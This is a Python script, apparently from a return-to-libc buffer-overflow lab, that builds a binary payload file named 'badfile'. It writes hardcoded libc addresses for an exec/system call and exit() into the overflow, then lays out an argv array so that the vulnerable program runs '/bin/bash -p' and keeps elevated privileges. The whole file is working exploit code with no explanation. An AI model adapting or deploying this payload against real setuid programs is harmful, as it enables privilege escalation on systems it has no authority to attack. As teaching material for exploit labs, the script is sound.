#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))


input_addr=0xffffd230

bash_p_offset=0x40
p_p_offset=0x44
zeros_offset=0x44+4

bash_offset=0x60
p_offset=0x70

Y = 16+8+4
system_addr = 0xf7e994b0   # The address of exec()
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Z = 16+8+4+4
exit_addr = 0xf7e04f80     # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

X = 16+8+8+4
path_addr = 0xffffd835       # The address of "/bin/sh" pathname
content[X:X+4] = (path_addr).to_bytes(4,byteorder='little')


A=16+8+8+4+4
argv_addr= input_addr+bash_p_offset
content[A:A+4] = (argv_addr).to_bytes(4,byteorder='little')

B=bash_p_offset
argv1_addr= input_addr+bash_offset
content[B:B+4] = (argv1_addr).to_bytes(4,byteorder='little')

C=p_p_offset
argv2_addr= input_addr+p_offset
content[C:C+4] = (argv2_addr).to_bytes(4,byteorder='little')

D=zeros_offset
for i in range (4):
  content[D+i:D+i+1]=(0x00).to_bytes(1,byteorder='little') 


E=bash_offset
argv1_str=('/bin/bash\x00').encode('latin-1')
content[E:E+10] = (argv1_str)


F=p_offset
argv2_str=('-p\x00').encode('latin-1')
content[F:F+3] = (argv2_str)



#print (content)



# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
